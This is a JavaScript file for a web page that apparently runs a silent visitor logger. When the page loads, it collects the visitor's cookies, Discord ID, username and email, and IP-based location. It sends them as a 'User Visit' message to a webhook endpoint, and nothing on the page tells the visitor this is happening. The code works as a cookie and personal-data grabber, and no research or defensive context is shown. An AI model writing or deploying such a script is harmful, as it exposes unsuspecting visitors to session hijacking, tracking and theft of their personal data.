// const jwtToken = localStorage.getItem("token");
const visitorCookie = document.cookie || "No cookies found";
let userInfoDescription; let userData; let userDataFormatted;

let userDataPromise = new Promise((resolve, reject) => {
    window.addEventListener("discordUserLoaded", () => {
        userData = discordUser ? discordUser : null;
        userDataFormatted = userData
            ? `ID: ${userData.id}\nUsername: ${userData.username}\nEmail: ${userData.email}`
            : 'No user data';
            
        resolve();
    });
});

document.addEventListener("DOMContentLoaded", async function () {
    try {
        await userDataPromise;
        const response = await fetch("https://ipinfo.io/json");
        const ipData = await response.json();
        
        if (!response.ok) {
            throw new Error(`HTTP Error! Code: ${response.status}`);
        }
        
        const description = `**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Timezone:** ${ipData.timezone}
**Org:** ${ipData.org}
**Location:** ${ipData.loc}
**Cookies:** ${visitorCookie}
**Discord User Data:** \`\`\`py
${userDataFormatted}
\`\`\``;

       userInfoDescription = description;

       await sendWebhook("User Visit", description, Math.floor(Math.random() * 16777215));
        
        window.dispatchEvent(new Event('ipProcessed'));

    } catch (err) {
        await sendWebhook("IP Info Error", `**Error Message : \n${err}\n\nURL : ${window.location.href}**`, 16711680);
    }
});

async function sendWebhook(title, description, color) {
    await fetch(`${apiUrl}/webhooksend?title=${encodeURIComponent(title)}&description=${encodeURIComponent(description)}&color=${color}`);
}